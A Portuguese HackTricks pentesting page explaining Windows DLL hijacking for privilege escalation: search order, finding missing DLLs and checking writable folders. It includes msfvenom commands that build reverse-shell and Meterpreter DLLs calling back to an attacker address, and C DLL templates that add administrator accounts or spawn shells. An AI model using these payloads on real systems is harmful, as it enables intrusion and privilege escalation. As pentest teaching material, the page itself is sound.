# Dll Hijacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se você está interessado em uma **carreira de hacking** e hackear o inquebrável - **estamos contratando!** (_fluência em polonês escrito e falado é necessária_).

{% embed url="https://www.stmcyber.com/careers" %}

## Definição

Primeiro de tudo, vamos entender a definição. O sequestro de DLL é, no sentido mais amplo, **enganar um aplicativo legítimo/confiável para carregar uma DLL arbitrária**. Termos como _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ e _DLL Side-Loading_ são frequentemente - erroneamente - usados para dizer a mesma coisa.

O sequestro de DLL pode ser usado para **executar** código, obter **persistência** e **elevar privilégios**. Dos três, o **menos provável** de encontrar é a **elevação de privilégios** de longe. No entanto, como isso faz parte da seção de elevação de privilégios, vou focar nessa opção. Além disso, observe que, independentemente do objetivo, um sequestro de DLL é realizado da mesma maneira.

### Tipos

Existem **várias abordagens** para escolher, com o sucesso dependendo de como o aplicativo está configurado para carregar suas DLLs necessárias. As abordagens possíveis incluem:

1. **Substituição de DLL**: substituir uma DLL legítima por uma DLL maliciosa. Isso pode ser combinado com _DLL Proxying_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)], que garante que todas as funcionalidades da DLL original permaneçam intactas.
2. **Sequestro da ordem de pesquisa de DLL**: DLLs especificadas por um aplicativo sem um caminho são procuradas em locais fixos em uma ordem específica \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]. O sequestro da ordem de pesquisa ocorre colocando a DLL maliciosa em um local que é pesquisado antes da DLL real. Isso às vezes inclui o diretório de trabalho do aplicativo alvo.
3. **Sequestro de DLL fantasma**: colocar uma DLL maliciosa no lugar de uma DLL ausente/inexistente que um aplicativo legítimo tenta carregar \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)].
4. **Redirecionamento de DLL**: alterar o local em que a DLL é procurada, por exemplo, editando a variável de ambiente `%PATH%`, ou arquivos `.exe.manifest` / `.exe.local` para incluir a pasta que contém a DLL maliciosa \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)].
5. **Substituição de DLL WinSxS**: substituir a DLL legítima pela DLL maliciosa na pasta WinSxS relevante da DLL alvo. Frequentemente referido como DLL side-loading \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)].
6. **Sequestro de DLL de caminho relativo**: copiar (e opcionalmente renomear) o aplicativo legítimo para uma pasta gravável pelo usuário, ao lado da DLL maliciosa. Da maneira como é usado, tem semelhanças com a Execução de Proxy Binário (Assinado) \[[8](https://attack.mitre.org/techniques/T1218/)]. Uma variação disso é chamada de 'traga seu próprio LOLbin' \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)], que traz o aplicativo legítimo com a DLL maliciosa (em vez de copiá-lo da localização legítima na máquina da vítima).

## Encontrando DLLs ausentes

A maneira mais comum de encontrar DLLs ausentes em um sistema é executar o [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **configurando** os **seguintes 2 filtros**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

e mostrar apenas a **Atividade do Sistema de Arquivos**:

![](<../../.gitbook/assets/image (314).png>)

Se você está procurando **DLLs ausentes em geral**, você **deixa** isso rodando por alguns **segundos**.\
Se você está procurando uma **DLL ausente em um executável específico**, você deve definir **outro filtro como "Nome do Processo" "contém" "\<nome do exec>", executá-lo e parar de capturar eventos**.
## Explorando Dlls Ausentes

Para elevar privilégios, a melhor chance que temos é ser capaz de **escrever uma dll que um processo privilegiado tentará carregar** em algum **local onde será procurada**. Portanto, seremos capazes de **escrever** uma dll em uma **pasta** onde a dll é procurada antes da pasta onde a **dll original** está (caso estranho), ou seremos capazes de **escrever em alguma pasta onde a dll será procurada** e a **dll original não existe** em nenhuma pasta.

### Ordem de Busca de Dlls

**Dentro da** [**documentação da Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **você pode encontrar como as Dlls são carregadas especificamente**.

Em geral, um **aplicativo Windows** usará **caminhos de busca pré-definidos para encontrar DLLs** e verificará esses caminhos em uma ordem específica. O sequestro de DLL geralmente ocorre colocando uma DLL maliciosa em uma dessas pastas, garantindo que a DLL seja encontrada antes da legítima. Esse problema pode ser mitigado fazendo com que o aplicativo especifique caminhos absolutos para as DLLs de que precisa.

Você pode ver a **ordem de busca de DLLs em sistemas de 32 bits** abaixo:

1. O diretório de onde o aplicativo foi carregado.
2. O diretório do sistema. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o caminho deste diretório. (_C:\Windows\System32_)
3. O diretório do sistema de 16 bits. Não há função que obtenha o caminho deste diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho deste diretório.
1. (_C:\Windows_)
5. O diretório atual.
6. Os diretórios listados na variável de ambiente PATH. Observe que isso não inclui o caminho por aplicativo especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o caminho de busca de DLLs.

Essa é a **ordem de busca padrão com o SafeDllSearchMode ativado**. Quando desativado, o diretório atual sobe para a segunda posição. Para desativar esse recurso, crie o valor do registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** e defina-o como 0 (o padrão é ativado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, a busca começa no diretório do módulo executável que o **LoadLibraryEx** está carregando.

Por fim, observe que **uma dll pode ser carregada indicando o caminho absoluto em vez apenas do nome**. Nesse caso, essa dll será **procurada apenas nesse caminho** (se a dll tiver dependências, elas serão procuradas apenas pelo nome).

Existem outras maneiras de alterar a ordem de busca, mas não vou explicá-las aqui.

#### Exceções na ordem de busca de dlls da documentação do Windows

* Se uma **DLL com o mesmo nome de módulo já estiver carregada na memória**, o sistema verifica apenas a redireção e um manifesto antes de recorrer à DLL carregada, não importa em qual diretório ela esteja. **O sistema não procura pela DLL**.
* Se a DLL estiver na lista de **DLLs conhecidas** para a versão do Windows em que o aplicativo está sendo executado, o **sistema usará sua cópia da DLL conhecida** (e as DLLs dependentes da DLL conhecida, se houver) **em vez de procurar** pela DLL. Para obter uma lista de DLLs conhecidas no sistema atual, consulte a seguinte chave do registro: **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.
* Se uma **DLL tiver dependências**, o sistema **procura** pelas DLLs dependentes como se elas fossem carregadas apenas com seus **nomes de módulo**. Isso é verdade **mesmo se a primeira DLL tiver sido carregada especificando um caminho completo**.

### Elevando Privilégios

**Requisitos**:

* **Encontrar um processo** que seja executado/será executado com **outros privilégios** (movimento horizontal/lateral) e que esteja **faltando uma dll**.
* Ter **permissão de escrita** em qualquer **pasta** onde a **dll** será **procurada** (provavelmente o diretório do executável ou alguma pasta dentro do caminho do sistema).

Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado faltando uma dll** e é ainda **mais estranho ter permissões de escrita em uma pasta do sistema** (você não pode por padrão). Mas, em ambientes mal configurados, isso é possível.\
No caso de ter sorte e encontrar-se atendendo aos requisitos, você pode verificar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja contornar o UAC**, você pode encontrar lá um **PoC** de sequestro de DLL para a versão do Windows que você pode usar (provavelmente apenas alterando o caminho da pasta onde você tem permissões de escrita).

Observe que você pode **verificar suas permissões em uma pasta** fazendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar as importações de um executável e as exportações de uma DLL com:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abusar do Dll Hijacking para elevar privilégios** com permissões para escrever em uma pasta **System Path**, verifique:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Ferramentas automatizadas

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará se você tem permissões de gravação em qualquer pasta dentro do sistema PATH.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as funções do **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll_.

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar uma dll que exporte pelo menos todas as funções que o executável importará dela**. De qualquer forma, observe que o Dll Hijacking é útil para [elevar do nível de integridade Médio para Alto **(burlando o UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de [**Alto para SYSTEM**](./#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar uma dll válida** dentro deste estudo de dll hijacking focado em dll hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção** você pode encontrar alguns **códigos básicos de dll** que podem ser úteis como **modelos** ou para criar uma **dll com funções não obrigatórias exportadas**.

## **Criando e compilando Dlls**

### **Dll Proxifying**

Basicamente, um **proxy de Dll** é uma Dll capaz de **executar seu código malicioso quando carregada**, mas também de **expor** e **funcionar** como **esperado**, **repassando todas as chamadas para a biblioteca real**.

Com a ferramenta \*\*\*\* [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) \*\*\*\* ou \*\*\*\* [**Spartacus**](https://github.com/Accenture/Spartacus) \*\*\*\* você pode realmente **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar uma dll proxificada** ou **indicar a Dll** e **gerar uma dll proxificada**.

### **Meterpreter**

**Obter shell reverso (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenha um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86 Não vi uma versão x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Observe que em vários casos, a Dll que você compila deve **exportar várias funções** que serão carregadas pelo processo vítima, se essas funções não existirem, o **binário não poderá carregá-las** e o **exploit falhará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se você está interessado em uma **carreira de hacking** e hackear o inquebrável - **estamos contratando!** (_fluência em polonês escrita e falada é necessária_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
